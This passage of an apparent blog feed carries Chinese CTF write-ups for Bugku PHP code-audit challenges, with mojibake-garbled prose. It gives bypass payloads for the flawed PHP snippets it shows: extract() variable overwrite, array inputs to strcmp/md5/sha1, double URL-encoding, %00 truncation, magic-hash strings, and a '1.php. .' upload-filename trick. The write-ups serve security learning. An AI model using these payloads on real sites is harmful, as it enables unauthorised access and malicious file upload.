class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;    &#125;&#125;</code></pre><p> è¿™ä¸€å¥ä»£ç æ˜¯ç”¨æ¥æ£€æµ‹æœ«å°¾æ˜¯å¦æ˜¯<code>.</code>ï¼Œå¯ä»¥åŒå†™ç»•è¿‡ã€‚<br>æŠ“åŒ…å°†æ–‡ä»¶åæ”¹ä¸º<code>1.php. .</code> ï¼ˆæ³¨æ„ä¸¤ç‚¹ä¹‹é—´æœ‰ç©ºæ ¼ï¼‰ å‰é¢å»æ‰.ç„¶åæ£€éªŒ.ä¸å­˜åœ¨ï¼Œå†å»ç©ºæ ¼ï¼Œç•™ä¸‹php.ï¼Œç„¶åphp.ä¸å±äº$deny_extæ•°ç»„ä¸­å­˜åœ¨çš„ï¼Œå½“ç„¶å°±ç›´æ¥æäº¤äº†ã€‚å› ä¸ºwindowsè‡ªåŠ¨å»ç‚¹ï¼Œäºæ˜¯phpåç¼€å°±å‡ºæ¥äº† </p><img src="https://i.loli.net/2020/11/30/wldCgUcOSKWPxMu.png" style="zoom:50%;">]]></content>
    
    
    <categories>
      
      <category>æ–‡ä»¶ä¸Šä¼ </category>
      
      <category>ä»£ç å®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MIME</tag>
      
      <tag>å¤§å°å†™ç»•è¿‡</tag>
      
      <tag>.htaccess</tag>
      
      <tag>windowsæ–‡ä»¶ç‰¹æ€§</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bugkuä»£ç å®¡è®¡</title>
    <link href="/2020/09/14/decode/"/>
    <url>/2020/09/14/decode/</url>
    
    <content type="html"><![CDATA[<h1 id="ç®€å•çš„ä»£ç å®¡è®¡"><a href="#ç®€å•çš„ä»£ç å®¡è®¡" class="headerlink" title="ç®€å•çš„ä»£ç å®¡è®¡"></a>ç®€å•çš„ä»£ç å®¡è®¡</h1><span id="more"></span><h2 id="extractå˜é‡è¦†ç›–"><a href="#extractå˜é‡è¦†ç›–" class="headerlink" title="extractå˜é‡è¦†ç›–"></a>extractå˜é‡è¦†ç›–</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;xxx&#x27;</span>;  <span class="hljs-comment">//æ–°å»ºå˜é‡</span>extract(<span class="hljs-variable">$_GET</span>);  <span class="hljs-comment">// å˜é‡è¦†ç›–</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$shiyan</span>))   <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦å­˜åœ¨</span>&#123;<span class="hljs-variable">$content</span>=trim(file_get_contents(<span class="hljs-variable">$flag</span>));<span class="hljs-comment">//æŠŠæ–‡ä»¶è¯»å…¥å­—ç¬¦ä¸²</span><span class="hljs-keyword">if</span>(<span class="hljs-variable">$shiyan</span>==<span class="hljs-variable">$content</span>)  <span class="hljs-comment">//åˆ¤æ–­ä¸¤å˜é‡æ˜¯å¦ç›¸ç­‰</span>&#123;<span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;flag&#123;xxx&#125;&#x27;</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Oh.no&#x27;</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>extract()å‡½æ•°</p><p><img src="https://i.loli.net/2020/11/28/z6p1eRwBdhAiJFK.png" alt="extrct.png"></p><p><strong>isset()å‡½æ•°</strong><br>isset() å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦å·²è®¾ç½®å¹¶ä¸”é NULLã€‚</p><p>å¦‚æœå·²ç»ä½¿ç”¨ unset() é‡Šæ”¾äº†ä¸€ä¸ªå˜é‡ä¹‹åï¼Œå†é€šè¿‡ isset() åˆ¤æ–­å°†è¿”å› FALSEã€‚</p><p>è‹¥ä½¿ç”¨ isset() æµ‹è¯•ä¸€ä¸ªè¢«è®¾ç½®æˆ NULL çš„å˜é‡ï¼Œå°†è¿”å› FALSEã€‚</p><p>åŒæ—¶è¦æ³¨æ„çš„æ˜¯ null å­—ç¬¦ï¼ˆâ€\0â€ï¼‰å¹¶ä¸ç­‰åŒäº PHP çš„ NULL å¸¸é‡ã€‚</p><p>Tips:isset()å‡½æ•°å¦‚æœä¸€æ¬¡ä¼ å…¥å¤šä¸ªå‚æ•°ï¼Œåªæœ‰å‚æ•°å…¨è¢«è®¾ç½®ä¸”éç©ºçš„æƒ…å†µä¸‹æ‰è¿”å›TRUEï¼Œisset()å‡½æ•°å¯¹æ•°ç»„ä¸­çš„å…ƒç´ åŒæ ·é€‚ç”¨ã€‚</p><p>file_get_contents() </p><p><img src="https://i.loli.net/2020/11/28/2TUeHbzKjo3v9WL.png" alt="file.png"></p><p>å˜é‡è¦†ç›–çš„æ„æ€å°±æ˜¯è®©è‡ªå·±ä¸Šä¼ çš„å˜é‡å€¼è¦†ç›–åŸæœ‰çš„å˜é‡å€¼</p><p>è¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯ <code>$shiyan</code>==<code>$content</code>,è€Œcontentçš„å€¼æ¥è‡ªäºå‡½æ•°è‡ªå·±å»ºçš„$flagå˜é‡ï¼Œæ‰€ä»¥è¿™é¢˜ç›®çš„å˜é‡è¦†ç›–å®é™…æ˜¯è¦†ç›–$flagçš„å€¼ï¼Œè®©flagçš„å€¼å’Œshiyançš„å€¼ç›¸åŒ</p><p>å¯ä»¥ç”¨ç©ºå€¼çš„æ–¹æ³•ä½¿äºŒè€…æƒ³ç­‰å³</p><p><code>?shiyan=&amp;flag=</code></p><h2 id="strcmpæ¯”è¾ƒå­—ç¬¦ä¸²"><a href="#strcmpæ¯”è¾ƒå­—ç¬¦ä¸²" class="headerlink" title="strcmpæ¯”è¾ƒå­—ç¬¦ä¸²"></a>strcmpæ¯”è¾ƒå­—ç¬¦ä¸²</h2><p><a href="http://123.206.87.240:9009/6.php">http://123.206.87.240:9009/6.php</a></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&#123;xxxxx&#125;&quot;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;<span class="hljs-keyword">if</span> (strcmp(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>], <span class="hljs-variable">$flag</span>) == <span class="hljs-number">0</span>) <span class="hljs-comment">//å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼› å¦‚æœ str1å¤§äº str2è¿”å› &gt; 0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚</span><span class="hljs-comment">//æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</span><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<span class="hljs-keyword">else</span><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;No&#x27;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>é¢˜ç›®ç»™çš„æ³¨é‡Šå¾ˆæ¸…æ¥šçš„ç»™å‡ºäº†è·å¾—flagçš„æ¡ä»¶ã€‚ã€‚ã€‚</p><p>å…ˆäº†è§£ä¸€ä¸‹</p><p><img src="https://i.loli.net/2020/11/28/HzFDTPCwtU1rkf2.png" alt="strcmp.png"></p><p>strcmp()çš„ä¸¤ä¸ªå‚æ•°éƒ½å¿…é¡»æ˜¯å­—ç¬¦ä¸²ç±»å‹çš„ï¼Œä½†æ˜¯å¦‚æœä¼ é€’ä¸€ä¸ªéå­—ç¬¦ç©¿ç±»å‹çš„å‚æ•°è¿›å»ï¼Œä¾‹å¦‚æ•°ç»„ï¼Œåˆ™å‡½æ•°å°±ä¼šæŠ¥é”™ï¼Œå…¶è¿”å›å€¼å°±ä¸º0ã€‚æ»¡è¶³ <code>if (strcmp($_GET[&#39;a&#39;], $flag) == 0)</code>  å³å¯è·å¾—flag</p><p><strong>url:<code>http://123.206.87.240:9009/6.php?a[]=</code></strong></p><h2 id="urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡"><a href="#urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡" class="headerlink" title="urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡"></a>urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡</h2><p>é¢˜ç›®è¯´çš„å¾ˆæ¸…æ¥šäº†ï¼ŒäºŒæ¬¡ç¼–ç ç»•è¿‡</p><pre><code class="hljs bash"><span class="hljs-keyword">if</span>(eregi(<span class="hljs-string">&quot;hackerDJ&quot;</span>,<span class="hljs-variable">$_GET</span>[id])) &#123;<span class="hljs-built_in">echo</span>(<span class="hljs-string">&quot;</span><span class="hljs-string"></span><span class="hljs-string">not allowed!</span><span class="hljs-string"></span><span class="hljs-string">&quot;</span>);</code></pre><blockquote><p>PHP å‡½æ•° eregi()</p><p>è¯­æ³•<br> int eregi(string pattern, string string, [array regs]);<br> å®šä¹‰å’Œç”¨æ³•<br> eregi()å‡½æ•°åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²æœç´¢æŒ‡å®šçš„æ¨¡å¼çš„å­—ç¬¦ä¸²ã€‚æœç´¢ä¸åŒºåˆ†å¤§å°å†™ã€‚Eregi()å¯ä»¥ç‰¹åˆ«æœ‰ç”¨çš„æ£€æŸ¥æœ‰æ•ˆæ€§å­—ç¬¦ä¸²,å¦‚å¯†ç ã€‚</p><p>å¯é€‰çš„è¾“å…¥å‚æ•°è§„åˆ™åŒ…å«ä¸€ä¸ªæ•°ç»„çš„æ‰€æœ‰åŒ¹é…è¡¨è¾¾å¼,ä»–ä»¬è¢«æ­£åˆ™è¡¨è¾¾å¼çš„æ‹¬å·åˆ†ç»„ã€‚</p><p>è¿”å›å€¼<br> å¦‚æœåŒ¹é…æˆåŠŸè¿”å›true,å¦åˆ™,åˆ™è¿”å›false</p></blockquote><p>è¿™é‡Œè¿›è¡Œäº†è¿‡æ»¤ï¼Œä¼ çš„å€¼ä¸èƒ½ä¸ºhackerDJ</p><pre><code class="hljs php"><span class="hljs-variable">$_GET</span>[id] = urldecode(<span class="hljs-variable">$_GET</span>[id]);<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[id] == <span class="hljs-string">&quot;hackerDJ&quot;</span>) <span class="hljs-comment">//è¦ç¼–ç çš„å­—ç¬¦ä¸²hackerDJ</span></code></pre><p>GETä¼šæäº¤æ—¶è¿›è¡Œä¸€æ¬¡urlencode</p><p>urldecode()äºurlencode()æ˜¯ä¸€å¯¹æƒ³åä½œç”¨çš„å‡½æ•°ï¼Œä¸€ä¸ªè§£ç ä¸€ä¸ªç¼–ç ã€‚</p><p><code>$_GET[id] = urldecode($_GET[id])</code>     urldecodeåçš„<strong>$_GET[id]</strong> å¤åˆ¶ç»™è‡ªå·±ç­‰äºhackerDJ</p><p>æ‰€ä»¥å¯¹hackerDJ è¿›è¡Œä¸¤æ¬¡urlencode, ä¸ºäº†ç»•è¿‡è¿‡æ»¤ï¼›è¿›è¡Œä¸€æ¬¡urldecodeåå…¶å€¼å’ŒhackerDJç›¸ç­‰ï¼Œå¾—åˆ°flag</p><p><code>?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</code></p><h2 id="md5-å‡½æ•°"><a href="#md5-å‡½æ•°" class="headerlink" title="md5()å‡½æ•°"></a>md5()å‡½æ•°</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Your password can not be your username.&#x27;</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) === md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<span class="hljs-keyword">else</span><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>åˆ©ç”¨md5ä¸èƒ½å¤„ç†æ•°ç»„çš„ç‰¹æ€§ç»•è¿‡</p><p><a href="https://www.w3school.com.cn/php/func_string_md5.asp">md5()</a></p><p>md5å‡½æ•°é‡åˆ°æ•°ç»„ç±»å‹çš„å‚æ•°æ—¶ï¼Œè¿”å›å€¼ä¸ºnullï¼Œnull===null,æ‰€ä»¥æ»¡è¶³<code>md5($_GET[&#39;username&#39;]) === md5($_GET[&#39;password&#39;]</code></p><pre><code class="hljs dts"><span class="hljs-symbol">GET:</span>/?username[]=<span class="hljs-number">1</span><span class="hljs-variable">&amp;password</span>[]=<span class="hljs-number">2</span></code></pre><h2 id="æ•°ç»„è¿”å›NULLç»•è¿‡"><a href="#æ•°ç»„è¿”å›NULLç»•è¿‡" class="headerlink" title="æ•°ç»„è¿”å›NULLç»•è¿‡"></a>æ•°ç»„è¿”å›NULLç»•è¿‡</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>) <span class="hljs-comment">//è¿›è¡Œè¿‡æ»¤ï¼Œpasswordå¿…é¡»åŒ…å«å­—æ¯å’Œæ•°å­—</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You password must be alphanumeric&#x27;</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;--&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);<span class="hljs-keyword">else</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>æç¤ºæ˜¯æ•°ç»„è¿”å›NULL</p><p>ç›´æ¥å°è¯•æäº¤<code>?password[]=</code>ï¼Œflagå°±å‡ºæ¥äº†</p><p>äº†è§£ä¸€ä¸‹åŸç†ï¼Œ</p><blockquote><p>ä»£ç ç›¸å…³çŸ¥è¯†ç‚¹é“¾æ¥å¦‚ä¸‹ï¼š</p><p>issetå‡½æ•°ï¼š<a href="http://php.net/manual/zh/function.isset.php">http://php.net/manual/zh/function.isset.php</a></p><p>eregå‡½æ•°ï¼š<a href="http://www.php.net/manual/zh/function.ereg.php">http://www.php.net/manual/zh/function.ereg.php</a></p><p>strposå‡½æ•°ï¼š<a href="http://www.w3school.com.cn/php/func_string_strpos.asp">http://www.w3school.com.cn/php/func_string_strpos.asp</a></p><p>â€œ[A-Za-z0-9]â€<br>æ–¹æ‹¬å·è¡¨ç¤ºå­—ç¬¦é›†ï¼Œ[A-Za-z0-9]åŒ¹é…å¤§å°å†™å­—æ¯å’Œæ•°å­—å…¶ä¸­ä¸€ä¸ªå­—ç¬¦</p><p>â€œ^[A-Za-z0-9]$â€<br>^è¡¨ç¤ºå­—ç¬¦ä¸²å¼€å§‹ï¼Œ$è¡¨ç¤ºå­—ç¬¦ä¸²ç»“æŸ ï¼Œè¿™ä¸ªåŒ¹é…åªæœ‰ä¸€ä¸ªå¤§å°å†™å­—æ¯å’Œæ•°å­—å­—ç¬¦çš„å­—ç¬¦ä¸²</p><p>â€œ^[A-Za-z0-9]+$â€<br>+å·è¡¨ç¤ºé‡å¤1åˆ°å¤šæ¬¡ï¼ŒåŒ¹é…ç”±å¤šä¸ªæ•°å­—å¤§å°å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²</p></blockquote><p><img src="https://i.loli.net/2020/11/28/2EjrzqhlvA4pcRg.png" alt="ereg.png"></p><p><img src="https://i.loli.net/2020/11/28/yMSHUw8EcGd9izo.png" alt="strpos.png"></p><p>å€¼å¾—æ³¨æ„çš„æ˜¯è¿™ä¸¤ä¸ªå‡½æ•°èƒ½å¤„ç†çš„å‚æ•°éƒ½æ˜¯stringç±»å‹</p><pre><code class="hljs php">eregåªèƒ½å¤„ç†å­—ç¬¦ï¼Œrå¦‚æœæ•°ç»„ï¼Œåˆ™è¿”å›çš„æ˜¯<span class="hljs-literal">null</span>ï¼Œä¸‰ä¸ªç­‰å·çš„æ—¶å€™ä¸ä¼šè¿›è¡Œç±»å‹è½¬æ¢ã€‚æ‰€ä»¥<span class="hljs-literal">null</span>ä¸ç­‰äº<span class="hljs-literal">false</span>ã€‚strposçš„å‚æ•°åŒæ ·ä¸èƒ½å¤Ÿæ˜¯æ•°ç»„ï¼Œæ‰€ä»¥è¿”å›çš„ä¾æ—§æ˜¯<span class="hljs-literal">null</span>ï¼Œ<span class="hljs-literal">null</span>ä¸ç­‰äº<span class="hljs-literal">false</span>ä¹Ÿæ˜¯æ­£ç¡®ã€‚</code></pre><p>æ•…?password[]=å¯ä»¥ç»•è¿‡ã€‚</p><p>ä½†æ˜¯è¿˜æœ‰ä¸€ç§ä¸º%00æˆªæ–­</p><p><code>?password=d%00--</code></p><h2 id="å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡"><a href="#å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡" class="headerlink" title="å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡"></a>å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡</h2><pre><code class="hljs php"><span class="hljs-variable">$temp</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];is_numeric(<span class="hljs-variable">$temp</span>)?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no numeric&quot;</span>):<span class="hljs-literal">NULL</span>;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$temp</span>&gt;<span class="hljs-number">1336</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;</code></pre><p>é¢˜ç›®è¯´äº†å¼±ç±»å‹æ¯”è¾ƒç»•è¿‡</p><p>payloadï¼š</p><pre><code class="hljs ini"><span class="hljs-attr">password</span>=<span class="hljs-number">1444</span>b</code></pre><p>é¦–å…ˆåœ¨is_numeric()æ£€æŸ¥æ—¶ï¼Œå› ä¸º1444bä¸­åŒ…å«äº†å­—æ¯bæ‰€ä»¥ä¸ä¼šè®¤ä¸ºæ˜¯æ•°å­—ç±»å‹</p><p>åœ¨åˆ¤æ–­æ˜¯å¦å¤§äº1336æ—¶ï¼Œphpé»˜è®¤1444bæ˜¯æ•°å­—ç±»å‹ï¼Œæ‰€ä»¥å¤§äº1336</p><h2 id="sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡"><a href="#sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡" class="headerlink" title="sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡"></a>sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;   var_dump(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;   var_dump(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);   var_dump(sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));   var_dump(sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]));       <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your password can not be your name!&#x27;</span>;   <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) === sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);   <span class="hljs-keyword">else</span>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password.&#x27;</span>;&#125;<span class="hljs-keyword">else</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Login first!&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre><p>ä»£ç é€»è¾‘å¾ˆç®€å•ï¼Œé¦–å…ˆåˆ¤æ–­æ˜¯å¦getæ–¹å¼ä¼ é€’nameå’Œpasswordå‚æ•°</p><p>var_dumpï¼Œè¾“å‡ºå‚æ•°ç±»å‹å’Œå€¼</p><p>ä¹‹åå¦‚æœé€šè¿‡ifåˆ¤æ–­åˆ™å¯ä»¥æ‹¿åˆ°flag</p><p>ifåˆ¤æ–­çš„æ¡ä»¶</p><blockquote><p>nameå’Œpasswordä¸èƒ½ç›¸åŒ</p><p>ä½†æ˜¯sha1(name)===sha1(password)</p></blockquote><p>è¿™é‡Œå¯ä»¥ä½¿ç”¨sha1å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„çš„æ¼æ´ç»•è¿‡ï¼Œsha1é‡åˆ°å‚æ•°ä¸ºæ•°ç»„ç±»å‹æ—¶è¿”å›å€¼ä¸º0</p><p>payloadï¼š</p><pre><code class="hljs dts"><span class="hljs-symbol">GET:</span>?name[]=<span class="hljs-number">1</span><span class="hljs-variable">&amp;password</span>[]=<span class="hljs-number">2</span></code></pre><h2 id="md5åŠ å¯†ç›¸ç­‰ç»•è¿‡"><a href="#md5åŠ å¯†ç›¸ç­‰ç»•è¿‡" class="headerlink" title="md5åŠ å¯†ç›¸ç­‰ç»•è¿‡"></a>md5åŠ å¯†ç›¸ç­‰ç»•è¿‡</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$md51</span> = md5(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>);<span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<span class="hljs-variable">$md52</span> = @md5(<span class="hljs-variable">$a</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;<span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="hljs-variable">$md51</span> == <span class="hljs-variable">$md52</span>) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&#123;*&#125;&quot;</span>;&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;false!!!&quot;</span>;&#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please input a&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>å³ä½¿ç”¨getæ–¹å¼ä¼ é€’ä¸€ä¸ªå‚æ•°a,ä½¿å¾—açš„å€¼ä¸ç­‰äº<code>QNKCDZO</code>ä½†æ˜¯äºŒè€…çš„md5å€¼ç›¸åŒ</p><p>PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚</p><p>å¸¸è§çš„payloadæœ‰</p><pre><code class="hljs stylus">QNKCDZO<span class="hljs-number">240610708</span>s878926199as155964671as214587387as214587387a<span class="hljs-comment">//ä¸‹é¢æ˜¯sha1()åŠ å¯†å ==ç›¸ç­‰çš„å­—ç¬¦ä¸²</span> sha1(str)<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aaroZmOk&#x27;</span>)</span></span>  <span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aaK1STfY&#x27;</span>)</span></span><span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aaO8zKZF&#x27;</span>)</span></span><span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aa3OFF9m&#x27;</span>)</span></span></code></pre><p>payload:</p><pre><code class="hljs routeros">GET:?<span class="hljs-attribute">a</span>=240610708</code></pre><h2 id="åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ"><a href="#åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ" class="headerlink" title="åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ"></a>åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">noother_says_correct</span>(<span class="hljs-params"><span class="hljs-variable">$temp</span></span>)</span><span class="hljs-function"></span>&#123;<span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;<span class="hljs-variable">$one</span> = ord(<span class="hljs-string">&#x27;1&#x27;</span>); <span class="hljs-comment">//ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</span><span class="hljs-variable">$nine</span> = ord(<span class="hljs-string">&#x27;9&#x27;</span>); <span class="hljs-comment">//ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</span><span class="hljs-variable">$number</span> = <span class="hljs-string">&#x27;3735929054&#x27;</span>;<span class="hljs-comment">// Check all the input characters!</span><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$number</span>); <span class="hljs-variable">$i</span>++)&#123;<span class="hljs-comment">// Disallow all the digits!</span><span class="hljs-variable">$digit</span> = ord(<span class="hljs-variable">$temp</span>&#123;<span class="hljs-variable">$i</span>&#125;);<span class="hljs-keyword">if</span> ( (<span class="hljs-variable">$digit</span> &gt;= <span class="hljs-variable">$one</span>) &amp;&amp; (<span class="hljs-variable">$digit</span> &lt;= <span class="hljs-variable">$nine</span>) )&#123;<span class="hljs-comment">// Aha, digit not allowed!</span><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flase&quot;</span>;&#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$number</span> == <span class="hljs-variable">$temp</span>)<span class="hljs-keyword">return</span> <span class="hljs-variable">$flag</span>;&#125;<span class="hljs-variable">$temp</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<span class="hljs-keyword">echo</span> noother_says_correct(<span class="hljs-variable">$temp</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>é‡ç‚¹åœ¨è¿™æ®µä»£ç </p><pre><code class="hljs php"><span class="hljs-keyword">if</span> ( (<span class="hljs-variable">$digit</span> &gt;= <span class="hljs-variable">$one</span>) 